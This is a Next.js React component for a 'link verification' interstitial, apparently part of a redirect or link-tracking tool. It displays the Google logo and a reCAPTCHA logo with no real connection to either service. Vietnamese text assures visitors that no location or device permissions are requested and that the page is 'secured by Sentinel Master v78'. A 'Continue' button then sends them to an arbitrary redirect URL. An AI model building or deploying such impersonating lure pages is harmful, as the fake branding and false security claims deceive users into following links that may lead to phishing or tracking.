'use client';

import React from 'react';
import Image from 'next/image';
import { FileText, ShieldCheck } from 'lucide-react';
import type { Link as LinkType } from '@/app/actions/links';
import { useSimpleRedirect } from '@/hooks/use-simple-redirect';
import { Button } from '@/components/ui/button';

interface LinkVerificationClientProps {
  link: LinkType;
}

export function LinkVerificationClient({ link }: LinkVerificationClientProps) {
  const { status, isRedirecting, startRedirect } = useSimpleRedirect({
    redirectUrl: link.redirectUrl,
    fallbackUrl: link.imageUrl,
  });

  return (
    <div className="flex justify-center items-center min-h-screen bg-white p-4 font-bold italic">
      <div aria-busy={isRedirecting} className="text-center w-full max-w-sm">
        <Image
          src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
          alt="Google"
          width={92}
          height={30}
          className="h-6 mx-auto mb-10 opacity-70"
        />

        {isRedirecting ? (
          <div className="animate-in fade-in duration-500">
            <div className="w-10 h-10 border-4 border-gray-100 border-t-blue-500 rounded-full animate-spin mx-auto mb-6" />
            <p className="text-gray-400 uppercase text-[9px] animate-pulse tracking-widest">{status}</p>
            <p className="text-gray-400 text-[9px] mt-2">Không yêu cầu vị trí hoặc quyền thiết bị.</p>

            <div className="mt-12 bg-gray-50 p-6 rounded-3xl border border-gray-100 opacity-40">
              <div className="flex items-center gap-3 mb-4 text-left px-2">
                <FileText className="h-5 w-5 text-blue-500 opacity-60" />
                <span className="text-[10px] text-gray-400 uppercase truncate">{link.title}</span>
              </div>
              <div className="aspect-video w-full rounded-2xl overflow-hidden bg-gray-200" />
            </div>
          </div>
        ) : (
          <div className="animate-in fade-in slide-in-from-bottom-4 duration-700">
            <div className="bg-gray-50 p-4 rounded-3xl border border-gray-100 mb-8 overflow-hidden shadow-sm">
              <div className="flex items-center gap-3 mb-4 text-left px-2">
                <FileText className="h-5 w-5 text-blue-500 opacity-60" />
                <span className="text-[10px] text-gray-400 uppercase truncate">{link.title}</span>
              </div>
              <div className="aspect-video w-full rounded-2xl overflow-hidden mb-2">
                <Image src={link.imageUrl} alt="Preview" width={400} height={225} className="object-cover w-full h-full grayscale opacity-50" />
              </div>
            </div>

            <Button
              onClick={startRedirect}
              disabled={isRedirecting}
              variant="outline"
              className="p-8 h-auto bg-white border border-gray-100 rounded-[30px] w-full shadow-lg text-[11px] uppercase flex justify-between items-center text-gray-700 hover:bg-gray-50 transition-all border-b-4 active:border-b-0 active:translate-y-1"
            >
              <span>TIẾP TỤC</span>
              <Image src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" width={20} height={20} className="opacity-40" />
            </Button>
          </div>
        )}

        <div className="mt-10 flex items-center justify-center gap-2 text-gray-300">
          <ShieldCheck className="h-3 w-3" />
          <p className="text-[8px] uppercase tracking-tighter">Bảo mật bởi Sentinel Master v78</p>
        </div>
      </div>
    </div>
  );
}
